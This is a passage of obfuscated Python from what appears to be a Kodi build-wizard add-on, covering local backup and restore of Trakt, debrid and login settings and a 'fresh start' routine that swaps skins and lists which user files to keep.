		O0OOO00O000O0OOOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4460
		O00OOO00OO00OO0O0 =xbmcvfs .copy (O00000OOOO000OO0O ,O0OOO00O000O0OOOO )#line:4461
		wiz .log ("%s"%str (O00OOO00OO00OO0O0 ))#line:4462
		extract .all (xbmc .translatePath (O0OOO00O000O0OOOO ),O00OOOO00000O00OO )#line:4463
		O0OO00OO0O0O00000 =os .path .join (O00OOOO00000O00OO ,'trakt')#line:4464
		O0O0000OOO00OOOOO =os .path .join (O00OOOO00000O00OO ,'login')#line:4465
		OOOOO0O0O0OO0OO00 =os .path .join (O00OOOO00000O00OO ,'debrid')#line:4466
		O00OO00OO0000OOOO =0 #line:4467
		if os .path .exists (O0OO00OO0O0O00000 ):#line:4468
			O00OO00OO0000OOOO +=1 #line:4469
			OO0OOO0O0O0OOO0OO =os .listdir (O0OO00OO0O0O00000 )#line:4470
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4471
			for O00O0O000000O0O00 in OO0OOO0O0O0OOO0OO :#line:4472
				OOOOO00O0000OOO00 =os .path .join (traktit .TRAKTFOLD ,O00O0O000000O0O00 )#line:4473
				O000OOOO0000OOOOO =os .path .join (O0OO00OO0O0O00000 ,O00O0O000000O0O00 )#line:4474
				if os .path .exists (OOOOO00O0000OOO00 ):#line:4475
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O0O000000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4476
					else :os .remove (OOOOO00O0000OOO00 )#line:4477
				shutil .copy (O000OOOO0000OOOOO ,OOOOO00O0000OOO00 )#line:4478
			traktit .importlist ('all')#line:4479
			traktit .traktIt ('restore','all')#line:4480
		if os .path .exists (O0O0000OOO00OOOOO ):#line:4481
			O00OO00OO0000OOOO +=1 #line:4482
			OO0OOO0O0O0OOO0OO =os .listdir (O0O0000OOO00OOOOO )#line:4483
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4484
			for O00O0O000000O0O00 in OO0OOO0O0O0OOO0OO :#line:4485
				OOOOO00O0000OOO00 =os .path .join (loginit .LOGINFOLD ,O00O0O000000O0O00 )#line:4486
				O000OOOO0000OOOOO =os .path .join (O0O0000OOO00OOOOO ,O00O0O000000O0O00 )#line:4487
				if os .path .exists (OOOOO00O0000OOO00 ):#line:4488
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O0O000000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4489
					else :os .remove (OOOOO00O0000OOO00 )#line:4490
				shutil .copy (O000OOOO0000OOOOO ,OOOOO00O0000OOO00 )#line:4491
			loginit .importlist ('all')#line:4492
			loginit .loginIt ('restore','all')#line:4493
		if os .path .exists (OOOOO0O0O0OO0OO00 ):#line:4494
			O00OO00OO0000OOOO +=1 #line:4495
			OO0OOO0O0O0OOO0OO =os .listdir (OOOOO0O0O0OO0OO00 )#line:4496
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4497
			for O00O0O000000O0O00 in OO0OOO0O0O0OOO0OO :#line:4498
				OOOOO00O0000OOO00 =os .path .join (debridit .REALFOLD ,O00O0O000000O0O00 )#line:4499
				O000OOOO0000OOOOO =os .path .join (OOOOO0O0O0OO0OO00 ,O00O0O000000O0O00 )#line:4500
				if os .path .exists (OOOOO00O0000OOO00 ):#line:4501
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O0O000000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4502
					else :os .remove (OOOOO00O0000OOO00 )#line:4503
				shutil .copy (O000OOOO0000OOOOO ,OOOOO00O0000OOO00 )#line:4504
			debridit .importlist ('all')#line:4505
			debridit .debridIt ('restore','all')#line:4506
		wiz .cleanHouse (O00OOOO00000O00OO )#line:4507
		wiz .removeFolder (O00OOOO00000O00OO )#line:4508
		os .remove (O0OOO00O000O0OOOO )#line:4509
		if O00OO00OO0000OOOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4510
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4511
	elif O00OO0OO0000OOO00 =='export':#line:4512
		O0O0OOO00OO00O0O0 =xbmc .translatePath (MYBUILDS )#line:4513
		O0O0OO0OO0OO00OO0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4514
		traktit .traktIt ('update','all')#line:4515
		loginit .loginIt ('update','all')#line:4516
		debridit .debridIt ('update','all')#line:4517
		O00000OOOO000OO0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4518
		O00000OOOO000OO0O =xbmc .translatePath (O00000OOOO000OO0O )#line:4519
		O0OO0000O00O00O00 =os .path .join (O0O0OOO00OO00O0O0 ,'SaveData.zip')#line:4520
		O0O00000000OOOOOO =zipfile .ZipFile (O0OO0000O00O00O00 ,mode ='w')#line:4521
		for OO000OOO00OOO00O0 in O0O0OO0OO0OO00OO0 :#line:4522
			if os .path .exists (OO000OOO00OOO00O0 ):#line:4523
				OO0OOO0O0O0OOO0OO =os .listdir (OO000OOO00OOO00O0 )#line:4524
				for OO00000OOOOOO00OO in OO0OOO0O0O0OOO0OO :#line:4525
					O0O00000000OOOOOO .write (os .path .join (OO000OOO00OOO00O0 ,OO00000OOOOOO00OO ),os .path .join (OO000OOO00OOO00O0 ,OO00000OOOOOO00OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4526
		O0O00000000OOOOOO .close ()#line:4527
		if O00000OOOO000OO0O ==O0O0OOO00OO00O0O0 :#line:4528
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000O00O00O00 ))#line:4529
		else :#line:4530
			try :#line:4531
				xbmcvfs .copy (O0OO0000O00O00O00 ,os .path .join (O00000OOOO000OO0O ,'SaveData.zip'))#line:4532
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00000OOOO000OO0O ,'SaveData.zip')))#line:4533
			except :#line:4534
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000O00O00O00 ))#line:4535
def freshStart (install =None ,over =False ):#line:4540
	if USERNAME =='':#line:4541
		ADDON .openSettings ()#line:4542
		sys .exit ()#line:4543
	O000OOO000000O0OO =u_list (SPEEDFILE )#line:4544
	(O000OOO000000O0OO )#line:4545
	O0O0O000OOOOOOO0O =(wiz .workingURL (O000OOO000000O0OO ))#line:4546
	(O0O0O000OOOOOOO0O )#line:4547
	if KEEPTRAKT =='true':#line:4548
		traktit .autoUpdate ('all')#line:4549
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4550
	if KEEPREAL =='true':#line:4551
		debridit .autoUpdate ('all')#line:4552
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4553
	if KEEPLOGIN =='true':#line:4554
		loginit .autoUpdate ('all')#line:4555
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4556
	if over ==True :O00O0OOO0O000O0OO =1 #line:4557
	elif install =='restore':O00O0OOO0O000O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4558
	elif install :O00O0OOO0O000O0OO =1 #line:4559
	else :O00O0OOO0O000O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4560
	if O00O0OOO0O000O0OO :#line:4561
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4562
			OO000OO00O0O000OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4563
			skinSwitch .swapSkins (OO000OO00O0O000OO )#line:4566
			OO00O000O000OO000 =0 #line:4567
			xbmc .sleep (1000 )#line:4568
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00O000O000OO000 <150 :#line:4569
				OO00O000O000OO000 +=1 #line:4570
				xbmc .sleep (1000 )#line:4571
				wiz .ebi ('SendAction(Select)')#line:4572
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4573
				wiz .ebi ('SendClick(11)')#line:4574
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4575
			xbmc .sleep (1000 )#line:4576
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4577
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4578
			return #line:4579
		wiz .addonUpdates ('set')#line:4580
		OOO00O0OO00O00OO0 =os .path .abspath (HOME )#line:4581
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4582
		O00O0OO00OOO00000 =sum ([len (O0OO00O0O00OOOOO0 )for OO00O00OOOOOO000O ,OOOOO00OO0O0O0OO0 ,O0OO00O0O00OOOOO0 in os .walk (OOO00O0OO00O00OO0 )]);O00000000O0O0O0OO =0 #line:4583
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4584
		EXCLUDES .append ('My_Builds')#line:4585
		EXCLUDES .append ('archive_cache')#line:4586
		EXCLUDES .append ('script.module.requests')#line:4587
		EXCLUDES .append ('myfav.anon')#line:4588
		if KEEPREPOS =='true':#line:4589
			OOOOO00O00OOOOO00 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4590
			for OO00000O0O0O0O0O0 in OOOOO00O00OOOOO00 :#line:4591
				OO0OO0OOO0OO00000 =os .path .split (OO00000O0O0O0O0O0 [:-1 ])[1 ]#line:4592
				if not OO0OO0OOO0OO00000 ==EXCLUDES :#line:4593
					EXCLUDES .append (OO0OO0OOO0OO00000 )#line:4594
		if KEEPSUPER =='true':#line:4595
			EXCLUDES .append ('plugin.program.super.favourites')#line:4596
		if KEEPMOVIELIST =='true':#line:4597
			EXCLUDES .append ('plugin.video.metalliq')#line:4598
		if KEEPMOVIELIST =='true':#line:4599
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4600
		if KEEPADDONS =='true':#line:4601
			EXCLUDES .append ('addons')#line:4602
		if KEEPADDONS =='true':#line:4603
			EXCLUDES .append ('addon_data')#line:4604
		EXCLUDES .append ('plugin.video.elementum')#line:4607
		EXCLUDES .append ('script.elementum.burst')#line:4608
		EXCLUDES .append ('script.elementum.burst-master')#line:4609
		EXCLUDES .append ('plugin.video.quasar')#line:4610
		EXCLUDES .append ('script.quasar.burst')#line:4611
		EXCLUDES .append ('skin.estuary')#line:4612
		if KEEPWHITELIST =='true':#line:4615
			O00OOOOO0OOO0OO0O =''#line:4616
			OO00OOOOO00OOOO0O =wiz .whiteList ('read')#line:4617
			if len (OO00OOOOO00OOOO0O )>0 :#line:4618
				for OO00000O0O0O0O0O0 in OO00OOOOO00OOOO0O :#line:4619
					try :O0OO000000OOO00OO ,OOOOO0OO0O00OOO0O ,OO000O00O0O0OO0OO =OO00000O0O0O0O0O0 #line:4620
					except :pass #line:4621
					if OO000O00O0O0OO0OO .startswith ('pvr'):O00OOOOO0OOO0OO0O =OOOOO0OO0O00OOO0O #line:4622
					O00O0OO0O000O00O0 =dependsList (OO000O00O0O0OO0OO )#line:4623
					for O00O00OOO000OO0O0 in O00O0OO0O000O00O0 :#line:4624
						if not O00O00OOO000OO0O0 in EXCLUDES :#line:4625
							EXCLUDES .append (O00O00OOO000OO0O0 )#line:4626
						OO00OOO0OO0000OOO =dependsList (O00O00OOO000OO0O0 )#line:4627
						for OOOOO00O00O0OOOOO in OO00OOO0OO0000OOO :#line:4628
							if not OOOOO00O00O0OOOOO in EXCLUDES :#line:4629
								EXCLUDES .append (OOOOO00O00O0OOOOO )#line:4630
					if not OO000O00O0O0OO0OO in EXCLUDES :#line:4631
						EXCLUDES .append (OO000O00O0O0OO0OO )#line:4632
				if not O00OOOOO0OOO0OO0O =='':wiz .setS ('pvrclient',OO000O00O0O0OO0OO )#line:4633
		if wiz .getS ('pvrclient')=='':#line:4634
			for OO00000O0O0O0O0O0 in EXCLUDES :#line:4635
				if OO00000O0O0O0O0O0 .startswith ('pvr'):#line:4636
					wiz .setS ('pvrclient',OO00000O0O0O0O0O0 )#line:4637
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4638
		OOO0000O0O0OO0000 =wiz .latestDB ('Addons')#line:4639
		for OO000O0OO0OO0O000 ,O00O00O0OOOO0O0OO ,O00OOOO00000O0000 in os .walk (OOO00O0OO00O00OO0 ,topdown =True ):#line:4640
			O00O00O0OOOO0O0OO [:]=[O00OO0O00O0OOO00O for O00OO0O00O0OOO00O in O00O00O0OOOO0O0OO if O00OO0O00O0OOO00O not in EXCLUDES ]#line:4641
			for O0OO000000OOO00OO in O00OOOO00000O0000 :#line:4642
				O00000000O0O0O0OO +=1 #line:4643
				OO000O00O0O0OO0OO =OO000O0OO0OO0O000 .replace ('/','\\').split ('\\')#line:4644
				OO00O000O000OO000 =len (OO000O00O0O0OO0OO )-1 #line:4646
				if OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4647
				elif O0OO000000OOO00OO =='MyVideos99.db'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4648
				elif O0OO000000OOO00OO =='MyVideos107.db'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4649
				elif O0OO000000OOO00OO =='MyVideos116.db'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4650
				elif O0OO000000OOO00OO =='MyVideos99.db'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4651
				elif O0OO000000OOO00OO =='MyVideos107.db'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4652
				elif O0OO000000OOO00OO =='MyVideos116.db'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4653
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4654
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'skin.anonymous.mod'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4655
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'skin.Premium.mod'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4656
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'skin.anonymous.nox'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4657
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'skin.phenomenal'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4658
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'plugin.video.metalliq'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4659
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'skin.titan'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4661
				elif OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'pvr.iptvsimple'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4662
				elif O0OO000000OOO00OO =='sources.xml'and OO000O00O0O0OO0OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4664
				elif O0OO000000OOO00OO =='quicknav.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4667
				elif O0OO000000OOO00OO =='x1101.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4668
				elif O0OO000000OOO00OO =='b-srtym-b.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4669
				elif O0OO000000OOO00OO =='x1102.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4670
				elif O0OO000000OOO00OO =='b-sdrvt-b.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4671
				elif O0OO000000OOO00OO =='x1112.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4672
				elif O0OO000000OOO00OO =='b-tlvvyzyh-b.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4673
				elif O0OO000000OOO00OO =='x1111.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4674
				elif O0OO000000OOO00OO =='b-tvknyshrly-b.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4675
				elif O0OO000000OOO00OO =='x1110.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4676
				elif O0OO000000OOO00OO =='b-yldym-b.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4677
				elif O0OO000000OOO00OO =='x1114.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4678
				elif O0OO000000OOO00OO =='b-mvzyqh-b.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4679
				elif O0OO000000OOO00OO =='mainmenu.DATA.xml'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4680
				elif O0OO000000OOO00OO =='skin.Premium.mod.properties'and OO000O00O0O0OO0OO [OO00O000O000OO000 -2 ]=='userdata'and OO000O00O0O0OO0OO [OO00O000O000OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO000O00O0O0OO0OO [OO00O000O000OO000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4681
				elif O0OO000000OOO00OO =='favourites.xml'and OO000O00O0O0OO0OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4685
				elif O0OO000000OOO00OO =='guisettings.xml'and OO000O00O0O0OO0OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4687
				elif O0OO000000OOO00OO =='profiles.xml'and OO000O00O0O0OO0OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4688
				elif O0OO000000OOO00OO =='advancedsettings.xml'and OO000O00O0O0OO0OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO000O0OO0OO0O000 ,O0OO000000OOO00OO ),xbmc .LOGNOTICE )#line:4689
